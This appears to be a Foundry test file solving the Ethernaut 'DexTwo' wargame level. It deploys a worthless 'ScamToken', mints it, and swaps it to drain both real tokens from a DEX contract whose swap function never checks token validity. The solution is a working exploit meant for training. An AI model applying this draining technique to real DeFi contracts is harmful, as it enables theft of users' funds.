// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {DexTwo} from "../../src/23/DexTwo.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {DexTwoFactory} from "src/23/DexTwoFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract DexTwoTest is Test, BaseTest {
    DexTwo public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new DexTwoFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = DexTwo(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        // Since there is no check on the validity of the tokens being swapped, we can create a random ERC20, mint as much as we need, and swap it for both token1 and token2 balance of DexTwo contract.

        ScamToken tokenToSwap = new ScamToken();
        tokenToSwap.approve(address(instanceContract), type(uint256).max);

        tokenToSwap.mint(player, 1);
        tokenToSwap.mint(address(instanceContract), 1);
        instanceContract.swap(address(tokenToSwap), instanceContract.token1(), 1);

        tokenToSwap.mint(player, 2);
        instanceContract.swap(address(tokenToSwap), instanceContract.token2(), 2);

        vm.stopPrank();

        uint256 balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
        uint256 balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));

        assert(balanceDexToken1 == 0 && balanceDexToken2 == 0);
    }
}

contract ScamToken is ERC20 {
    address owner;

    constructor() ERC20("DEXScammer", "DEXS") {
        owner = msg.sender;
    }

    function mint(address receiver, uint256 amount) external {
        require(msg.sender == owner);

        _mint(receiver, amount);
    }
}
